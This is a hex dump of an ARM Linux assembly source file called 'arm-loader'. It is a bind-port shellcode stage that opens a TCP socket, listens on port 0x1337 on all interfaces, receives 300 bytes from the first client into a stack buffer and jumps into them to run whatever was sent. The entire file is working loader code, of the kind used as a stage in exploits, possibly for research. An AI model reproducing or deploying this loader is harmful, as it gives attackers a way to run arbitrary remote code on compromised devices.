00000000  2f 2a 0d 0a 20 2a 20 54  69 74 6c 65 3a 20 61 72  |/*.. * Title: ar|
00000010  6d 2d 6c 6f 61 64 65 72  0d 0a 20 2a 20 42 72 69  |m-loader.. * Bri|
00000020  65 66 3a 20 42 69 6e 64  20 70 6f 72 74 20 30 78  |ef: Bind port 0x|
00000030  31 33 33 37 20 6f 6e 20  61 6e 79 20 6c 6f 63 61  |1337 on any loca|
00000040  6c 20 69 6e 74 65 72 66  61 63 65 2c 20 6c 69 73  |l interface, lis|
00000050  74 65 6e 20 66 6f 72 20  61 20 63 6f 6e 6e 65 63  |ten for a connec|
00000060  74 69 6f 6e 0d 0a 20 2a  20 20 20 20 20 20 20 20  |tion.. *        |
00000070  72 65 63 65 69 76 65 20  61 20 70 61 79 6c 6f 61  |receive a payloa|
00000080  64 2c 20 61 6e 64 20 70  61 73 73 20 65 78 65 63  |d, and pass exec|
00000090  75 74 69 6f 6e 20 74 6f  20 69 74 0d 0a 20 2a 20  |ution to it.. * |
000000a0  41 75 74 68 6f 72 3a 20  44 61 6e 69 65 6c 20 47  |Author: Daniel G|
000000b0  6f 64 61 73 2d 4c 6f 70  65 7a 20 3c 67 6d 61 69  |odas-Lopez <gmai|
000000c0  6c 20 61 63 63 6f 75 6e  74 20 64 67 6f 64 61 73  |l account dgodas|
000000d0  3e 0d 0a 20 2a 2f 0d 0a  20 0d 0a 20 20 20 20 2f  |>.. */.. ..    /|
000000e0  2a 0d 0a 20 20 20 20 20  20 73 6f 63 5f 64 65 73  |*..      soc_des|
000000f0  20 3d 20 73 6f 63 6b 65  74 28 41 46 5f 49 4e 45  | = socket(AF_INE|
00000100  54 2c 20 53 4f 43 4b 5f  53 54 52 45 41 4d 2c 20  |T, SOCK_STREAM, |
00000110  49 50 50 52 4f 54 4f 5f  54 43 50 29 3b 0d 0a 20  |IPPROTO_TCP);.. |
00000120  20 20 20 20 2a 2f 0d 0a  20 0d 0a 20 20 20 20 6d  |    */.. ..    m|
00000130  6f 76 20 25 72 30 2c 20  24 32 20 20 20 20 20 2f  |ov %r0, $2     /|
00000140  2a 20 41 46 5f 49 4e 45  54 20 2a 2f 0d 0a 20 20  |* AF_INET */..  |
00000150  20 20 6d 6f 76 20 25 72  31 2c 20 24 31 20 20 20  |  mov %r1, $1   |
00000160  20 20 2f 2a 20 53 4f 43  4b 5f 53 54 52 45 41 4d  |  /* SOCK_STREAM|
00000170  20 2a 2f 0d 0a 20 20 20  20 6d 6f 76 20 25 72 32  | */..    mov %r2|
00000180  2c 20 24 36 20 20 20 20  20 2f 2a 20 49 50 50 52  |, $6     /* IPPR|
00000190  54 4f 54 4f 5f 54 43 50  20 2a 2f 0d 0a 20 20 20  |TOTO_TCP */..   |
000001a0  20 70 75 73 68 20 7b 25  72 30 2c 20 25 72 31 2c  | push {%r0, %r1,|
000001b0  20 25 72 32 7d 0d 0a 20  20 20 20 6d 6f 76 20 25  | %r2}..    mov %|
000001c0  72 30 2c 20 24 31 20 20  20 20 20 2f 2a 20 73 6f  |r0, $1     /* so|
000001d0  63 6b 65 74 20 2a 2f 0d  0a 20 20 20 20 6d 6f 76  |cket */..    mov|
000001e0  20 25 72 31 2c 20 25 73  70 0d 0a 20 20 20 20 73  | %r1, %sp..    s|
000001f0  76 63 20 30 78 30 30 39  30 30 30 36 36 0d 0a 20  |vc 0x00900066.. |
00000200  20 20 20 61 64 64 20 25  73 70 2c 20 25 73 70 2c  |   add %sp, %sp,|
00000210  20 24 31 32 0d 0a 20 0d  0a 20 20 20 20 6d 6f 76  | $12.. ..    mov|
00000220  20 25 72 36 2c 20 25 72  30 20 20 20 20 20 20 20  | %r6, %r0       |
00000230  20 2f 2a 20 72 36 20 3d  20 73 6f 63 5f 64 65 73  | /* r6 = soc_des|
00000240  20 2a 2f 0d 0a 20 0d 0a  20 20 20 20 2f 2a 0d 0a  | */.. ..    /*..|
00000250  20 20 20 20 20 20 62 69  6e 64 28 73 6f 63 5f 64  |      bind(soc_d|
00000260  65 73 2c 20 28 73 74 72  75 63 74 20 73 6f 63 6b  |es, (struct sock|
00000270  61 64 64 72 20 2a 29 20  26 73 65 72 76 5f 61 64  |addr *) &serv_ad|
00000280  64 72 2c 20 73 69 7a 65  6f 66 28 73 65 72 76 5f  |dr, sizeof(serv_|
00000290  61 64 64 72 29 29 3b 0d  0a 20 20 20 20 20 2a 2f  |addr));..     */|
000002a0  0d 0a 20 0d 0a 2e 69 66  20 30 20 2f 2a 20 72 30  |.. ...if 0 /* r0|
000002b0  20 3d 3d 20 72 36 20 61  6c 72 65 61 64 79 20 2a  | == r6 already *|
000002c0  2f 0d 0a 20 20 20 20 6d  6f 76 20 25 72 30 2c 20  |/..    mov %r0, |
000002d0  25 72 36 20 20 20 20 20  20 20 20 2f 2a 20 73 6f  |%r6        /* so|
000002e0  63 5f 64 65 73 20 2a 2f  0d 0a 2e 65 6e 64 69 66  |c_des */...endif|
000002f0  0d 0a 20 0d 0a 20 20 20  20 6d 6f 76 20 25 72 31  |.. ..    mov %r1|
00000300  2c 20 24 30 78 33 37 0d  0a 20 20 20 20 6d 6f 76  |, $0x37..    mov|
00000310  20 25 72 37 2c 20 24 30  78 31 33 0d 0a 20 20 20  | %r7, $0x13..   |
00000320  20 6d 6f 76 20 25 72 31  2c 20 25 72 31 2c 20 6c  | mov %r1, %r1, l|
00000330  73 6c 20 24 32 34 0d 0a  20 20 20 20 61 64 64 20  |sl $24..    add |
00000340  25 72 31 2c 20 25 72 37  2c 20 6c 73 6c 20 24 31  |%r1, %r7, lsl $1|
00000350  36 0d 0a 20 20 20 20 61  64 64 20 25 72 31 2c 20  |6..    add %r1, |
00000360  24 32 20 20 20 20 20 2f  2a 20 70 6f 72 74 20 3d  |$2     /* port =|
00000370  20 30 78 31 33 33 37 2c  20 66 61 6d 69 6c 79 20  | 0x1337, family |
00000380  3d 20 32 20 28 41 46 5f  49 4e 45 54 29 20 2a 2f  |= 2 (AF_INET) */|
00000390  0d 0a 20 20 20 20 73 75  62 20 25 72 32 2c 20 25  |..    sub %r2, %|
000003a0  72 32 2c 20 25 72 32 20  20 20 2f 2a 20 61 64 64  |r2, %r2   /* add|
000003b0  72 20 3d 20 30 2e 30 2e  30 2e 30 20 2a 2f 0d 0a  |r = 0.0.0.0 */..|
000003c0  20 20 20 20 70 75 73 68  20 7b 25 72 31 2c 20 25  |    push {%r1, %|
000003d0  72 32 7d 0d 0a 20 20 20  20 6d 6f 76 20 25 72 31  |r2}..    mov %r1|
000003e0  2c 20 25 73 70 20 20 20  20 20 20 20 20 2f 2a 20  |, %sp        /* |
000003f0  70 6f 69 6e 74 65 72 20  74 6f 20 73 6f 63 6b 61  |pointer to socka|
00000400  64 64 72 5f 69 6e 20 2a  2f 0d 0a 20 20 20 20 6d  |ddr_in */..    m|
00000410  6f 76 20 25 72 32 2c 20  24 31 36 20 20 20 20 20  |ov %r2, $16     |
00000420  20 20 20 2f 2a 20 73 69  7a 65 6f 66 28 73 74 72  |   /* sizeof(str|
00000430  75 63 74 20 73 6f 63 6b  61 64 64 72 5f 69 6e 29  |uct sockaddr_in)|
00000440  20 2a 2f 0d 0a 20 20 20  20 20 0d 0a 20 20 20 20  | */..     ..    |
00000450  70 75 73 68 20 7b 25 72  30 2c 20 25 72 31 2c 20  |push {%r0, %r1, |
00000460  25 72 32 7d 0d 0a 20 20  20 20 6d 6f 76 20 25 72  |%r2}..    mov %r|
00000470  30 2c 20 24 32 20 20 20  20 20 2f 2a 20 62 69 6e  |0, $2     /* bin|
00000480  64 20 2a 2f 0d 0a 20 20  20 20 6d 6f 76 20 25 72  |d */..    mov %r|
00000490  31 2c 20 25 73 70 0d 0a  20 20 20 20 73 76 63 20  |1, %sp..    svc |
000004a0  30 78 30 30 39 30 30 30  36 36 0d 0a 20 20 20 20  |0x00900066..    |
000004b0  61 64 64 20 25 73 70 2c  20 25 73 70 2c 20 24 32  |add %sp, %sp, $2|
000004c0  30 0d 0a 20 0d 0a 20 20  20 20 2f 2a 0d 0a 20 20  |0.. ..    /*..  |
000004d0  20 20 20 20 6c 69 73 74  65 6e 28 73 6f 63 5f 64  |    listen(soc_d|
000004e0  65 73 2c 20 31 29 3b 0d  0a 20 20 20 20 20 2f 2a  |es, 1);..     /*|
000004f0  0d 0a 20 0d 0a 20 20 20  20 6d 6f 76 20 25 72 31  |.. ..    mov %r1|
00000500  2c 20 24 31 20 20 20 20  20 2f 2a 20 62 61 63 6b  |, $1     /* back|
00000510  6c 6f 67 20 28 73 65 65  20 6d 61 6e 20 32 20 6c  |log (see man 2 l|
00000520  69 73 74 65 6e 29 20 2a  2f 0d 0a 20 20 20 20 6d  |isten) */..    m|
00000530  6f 76 20 25 72 30 2c 20  25 72 36 20 20 20 20 20  |ov %r0, %r6     |
00000540  20 20 20 2f 2a 20 73 6f  63 5f 64 65 73 20 2a 2f  |   /* soc_des */|
00000550  0d 0a 20 20 20 20 70 75  73 68 20 7b 25 72 30 2c  |..    push {%r0,|
00000560  20 25 72 31 7d 0d 0a 20  20 20 20 6d 6f 76 20 25  | %r1}..    mov %|
00000570  72 30 2c 20 24 34 20 20  20 20 20 2f 2a 20 6c 69  |r0, $4     /* li|
00000580  73 74 65 6e 20 2a 2f 0d  0a 20 20 20 20 6d 6f 76  |sten */..    mov|
00000590  20 25 72 31 2c 20 25 73  70 0d 0a 20 20 20 20 73  | %r1, %sp..    s|
000005a0  76 63 20 30 78 30 30 39  30 30 30 36 36 0d 0a 20  |vc 0x00900066.. |
000005b0  20 20 20 61 64 64 20 25  73 70 2c 20 24 38 0d 0a  |   add %sp, $8..|
000005c0  20 0d 0a 20 20 20 20 2f  2a 0d 0a 20 20 20 20 20  | ..    /*..     |
000005d0  20 73 6f 63 5f 63 6c 69  20 3d 20 61 63 63 65 70  | soc_cli = accep|
000005e0  74 28 73 6f 63 5f 64 65  73 2c 20 30 2c 20 30 29  |t(soc_des, 0, 0)|
000005f0  3b 0d 0a 20 20 20 20 20  2a 2f 0d 0a 20 0d 0a 20  |;..     */.. .. |
00000600  20 20 20 6d 6f 76 20 25  72 30 2c 20 25 72 36 20  |   mov %r0, %r6 |
00000610  20 20 20 20 20 20 20 2f  2a 20 73 6f 63 5f 64 65  |       /* soc_de|
00000620  73 20 2a 2f 0d 0a 20 20  20 20 73 75 62 20 25 72  |s */..    sub %r|
00000630  31 2c 20 25 72 31 2c 20  25 72 31 0d 0a 20 20 20  |1, %r1, %r1..   |
00000640  20 73 75 62 20 25 72 32  2c 20 25 72 32 2c 20 25  | sub %r2, %r2, %|
00000650  72 32 0d 0a 20 20 20 20  70 75 73 68 20 7b 25 72  |r2..    push {%r|
00000660  30 2c 20 25 72 31 2c 20  25 72 32 7d 0d 0a 20 20  |0, %r1, %r2}..  |
00000670  20 20 6d 6f 76 20 25 72  30 2c 20 24 35 20 20 20  |  mov %r0, $5   |
00000680  20 20 2f 2a 20 61 63 63  65 70 74 20 2a 2f 0d 0a  |  /* accept */..|
00000690  20 20 20 20 6d 6f 76 20  25 72 31 2c 20 25 73 70  |    mov %r1, %sp|
000006a0  0d 0a 20 20 20 20 73 76  63 20 30 78 30 30 39 30  |..    svc 0x0090|
000006b0  30 30 36 36 0d 0a 20 20  20 20 61 64 64 20 25 73  |0066..    add %s|
000006c0  70 2c 20 25 73 70 2c 20  24 31 32 0d 0a 20 0d 0a  |p, %sp, $12.. ..|
000006d0  20 20 20 20 6d 6f 76 20  25 72 36 2c 20 25 72 30  |    mov %r6, %r0|
000006e0  20 20 20 20 20 20 20 20  2f 2a 20 72 36 20 3d 20  |        /* r6 = |
000006f0  73 6f 63 5f 63 6c 69 20  2a 2f 0d 0a 20 0d 0a 20  |soc_cli */.. .. |
00000700  20 20 20 2f 2a 0d 0a 20  20 20 20 20 20 72 65 63  |   /*..      rec|
00000710  76 28 73 6f 63 5f 64 65  73 2c 20 62 75 66 66 2c  |v(soc_des, buff,|
00000720  20 6c 65 6e 2c 20 66 6c  61 67 73 29 3b 0d 0a 20  | len, flags);.. |
00000730  20 20 20 20 2a 2f 0d 0a  20 0d 0a 20 20 20 20 73  |    */.. ..    s|
00000740  75 62 20 25 72 34 2c 20  25 73 70 2c 20 24 33 31  |ub %r4, %sp, $31|
00000750  36 20 20 2f 2a 20 62 75  66 66 65 72 20 6f 6e 20  |6  /* buffer on |
00000760  74 68 65 20 73 74 61 63  6b 20 2b 20 31 36 20 62  |the stack + 16 b|
00000770  79 74 65 73 20 70 61 64  64 69 6e 67 20 2a 2f 0d  |ytes padding */.|
00000780  0a 20 20 20 20 73 75 62  20 25 72 35 2c 20 25 72  |.    sub %r5, %r|
00000790  35 2c 20 25 72 35 20 20  20 2f 2a 20 62 79 74 65  |5, %r5   /* byte|
000007a0  20 63 6f 75 6e 74 20 2a  2f 0d 0a 20 0d 0a 31 3a  | count */.. ..1:|
000007b0  20 20 6d 6f 76 20 25 72  30 2c 20 25 72 36 0d 0a  |  mov %r0, %r6..|
000007c0  20 20 20 20 61 64 64 20  25 72 31 2c 20 25 72 34  |    add %r1, %r4|
000007d0  2c 20 25 72 35 20 20 20  2f 2a 20 64 73 74 20 70  |, %r5   /* dst p|
000007e0  6f 69 6e 74 65 72 20 2a  2f 0d 0a 20 20 20 20 6d  |ointer */..    m|
000007f0  6f 76 20 25 72 32 2c 20  24 33 30 30 20 20 20 20  |ov %r2, $300    |
00000800  20 20 20 2f 2a 20 33 30  30 20 62 79 74 65 73 20  |   /* 300 bytes |
00000810  2a 2f 0d 0a 20 20 20 20  6d 6f 76 20 25 72 33 2c  |*/..    mov %r3,|
00000820  20 24 32 35 36 20 20 20  20 20 20 20 2f 2a 20 4d  | $256       /* M|
00000830  53 47 5f 57 41 49 54 41  4c 4c 20 2a 2f 0d 0a 20  |SG_WAITALL */.. |
00000840  20 20 20 70 75 73 68 20  7b 25 72 30 2c 20 25 72  |   push {%r0, %r|
00000850  31 2c 20 25 72 32 2c 20  25 72 33 7d 0d 0a 20 0d  |1, %r2, %r3}.. .|
00000860  0a 20 20 20 20 6d 6f 76  20 25 72 30 2c 20 24 31  |.    mov %r0, $1|
00000870  30 20 20 20 20 20 20 20  20 2f 2a 20 72 65 63 76  |0        /* recv|
00000880  20 2a 2f 0d 0a 20 20 20  20 6d 6f 76 20 25 72 31  | */..    mov %r1|
00000890  2c 20 25 73 70 0d 0a 20  20 20 20 73 76 63 20 30  |, %sp..    svc 0|
000008a0  78 30 30 39 30 30 30 36  36 0d 0a 20 20 20 20 61  |x00900066..    a|
000008b0  64 64 20 25 73 70 2c 20  25 73 70 2c 20 24 31 36  |dd %sp, %sp, $16|
000008c0  0d 0a 20 20 20 20 61 64  64 20 25 72 35 2c 20 25  |..    add %r5, %|
000008d0  72 30 0d 0a 20 20 20 20  63 6d 70 20 25 72 35 2c  |r0..    cmp %r5,|
000008e0  20 24 33 30 30 0d 0a 20  20 20 20 62 6e 65 20 31  | $300..    bne 1|
000008f0  62 0d 0a 20 0d 0a 20 20  20 20 2f 2a 0d 0a 20 20  |b.. ..    /*..  |
00000900  20 20 20 20 4a 75 6d 70  20 69 6e 74 6f 20 63 6f  |    Jump into co|
00000910  64 65 0d 0a 20 20 20 20  20 2a 2f 0d 0a 20 0d 0a  |de..     */.. ..|
00000920  20 20 20 20 6d 6f 76 20  25 70 63 2c 20 25 72 34  |    mov %pc, %r4|
00000930
